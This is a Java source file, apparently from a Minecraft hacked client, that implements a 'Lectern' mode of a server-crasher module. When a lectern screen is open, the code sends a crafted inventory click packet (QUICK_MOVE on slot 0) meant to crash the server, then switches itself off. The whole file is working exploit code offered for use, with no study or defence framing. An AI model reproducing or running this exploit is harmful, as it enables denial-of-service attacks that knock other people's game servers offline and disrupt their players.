package de.vandalismdevelopment.vandalism.feature.impl.module.impl.exploit.modes.servercrasher;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import de.vandalismdevelopment.vandalism.base.event.TickListener;
import de.vandalismdevelopment.vandalism.base.event.WorldListener;
import de.vandalismdevelopment.vandalism.feature.impl.module.ModuleMode;
import de.vandalismdevelopment.vandalism.feature.impl.module.impl.exploit.ServerCrasherModule;
import de.vandalismdevelopment.vandalism.util.minecraft.impl.InventoryUtil;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;

public class LecternModuleMode extends ModuleMode<ServerCrasherModule> implements TickListener, WorldListener {

    public LecternModuleMode(final ServerCrasherModule parent) {
        super("Lectern", parent);
    }

    @Override
    public void onEnable() {
        DietrichEvents2.global().subscribe(TickEvent.ID, this);
        DietrichEvents2.global().subscribe(WorldLoadEvent.ID, this);
    }

    @Override
    public void onDisable() {
        DietrichEvents2.global().unsubscribe(TickEvent.ID, this);
        DietrichEvents2.global().unsubscribe(WorldLoadEvent.ID, this);
    }

    @Override
    public void onPreWorldLoad() {
        this.getParent().disable();
    }

    @Override
    public void onTick() {
        if (this.player() == null || this.networkHandler() == null) return;
        if (this.currentScreen() instanceof LecternScreen) {
            final ScreenHandler currentScreenHandler = this.player().currentScreenHandler;
            this.networkHandler().sendPacket(new ClickSlotC2SPacket(
                    currentScreenHandler.syncId,
                    currentScreenHandler.getRevision(),
                    0,
                    0,
                    SlotActionType.QUICK_MOVE,
                    currentScreenHandler.getCursorStack().copy(),
                    InventoryUtil.createDummyModifiers()
            ));
            this.getParent().disable();
        }
    }

}
